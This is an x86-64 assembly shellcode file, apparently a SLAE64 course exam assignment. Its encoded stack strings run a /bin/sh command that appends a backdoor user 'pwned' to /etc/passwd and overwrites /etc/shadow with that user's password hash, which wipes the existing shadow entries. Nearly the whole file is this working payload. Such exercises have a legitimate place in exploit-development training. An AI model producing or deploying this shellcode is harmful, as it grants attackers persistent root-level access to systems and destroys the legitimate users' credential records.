;Exam Assignment (other personnal shellcode)
;This shellcode add a standard user , name pwned , pass = $pass"
;in /ect/shadow /etc/passwd
; shellcode use execve with the echo command to write to file;
;Christophe G SLAE64 - 1337                 ;



global _start


	_start:

	xor r12 , r12
	push r12                           ; null terminate string
        push byte 0x77
	mov r9, 0x6f646168732f6374
        push r9
	mov r9, 0x652f203e3e203a3a
        push r9
	mov r9, 0x3a373a3939393939
        push r9
        mov r9, 0x3a303a3136323631
        push r9
	mov r9, 0x3a2f664f4f4c4863
        push r9
        mov r9, 0x67336b4d4438516c
        push r9
	mov r9, 0x56554b566179376c
        push r9
        mov r9, 0x796f6d6149324f4a
        push r9
	mov r9, 0x4964785152786247              ;"echo pwned:x:1000:1002:pwned,,,:/home/pwned:/bin/bash >> /etc/passwd ;"
        push r9
        mov r9, 0x6b7265506a4b526f            ;"echo pwned:\$6\$uiH7x.vhivD7LLXY\$7sK1L1KW.ChqWQZow3esvpbWVXyR6LA431tOLhMoRKjPerkGbxRQxdIJO2Iamoyl7yaVKUVlQ8DMk3gcHLOOf/:16261:0:99999:7::: > /etc/shadow"
        push r9
        mov r9, 0x4d684c4f74313334                ;"name = pwned ; pass = $pass$"
        push r9
        mov r9, 0x414c365279585657
        push r9
	mov r9, 0x627076736533776f
        push r9
        mov r9, 0x5a51577168432e57
        push r9
	mov r9, 0x4b314c314b733724
        push r9
        mov r9, 0x5c59584c4c374476
        push r9
	mov r9, 0x6968762e78374869
        push r9
        mov r9, 0x75245c36245c3a64
        push r9
	mov r9, 0x656e7770206f6863
        push r9
        mov r9, 0x65203b2064777373
        push r9
	mov r9, 0x61702f6374652f20
        push r9
        mov r9, 0x3e3e20687361622f
        push r9
	mov r9, 0x6e69622f3a64656e
        push r9
        mov r9, 0x77702f656d6f682f
        push r9
	mov r9, 0x3a2c2c2c64656e77
        push r9
        mov r9, 0x703a323030313a30
        push r9
	mov r9, 0x3030313a783a6465
        push r9
	mov r9, 0x6e7770206f686365
        push r9
	mov r9 , rsp


	push r12
	pop rdx
        push r12
	push word 0x632d
	mov r10 , rsp

	push r12
	mov rdi , 0x68732f6e69622fff                      ; execve("/bin/sh" ,{"/bin/sh" ,"-c" , "echo pwned:\$6\$uiH7x....: > /etc/shadow"} ,0)
	shr rdi , 8
	push rdi
	mov rdi , rsp


	push rdx
	push r9
	push r10
	push rdi
	mov rsi , rsp
	add al , 59
	syscall

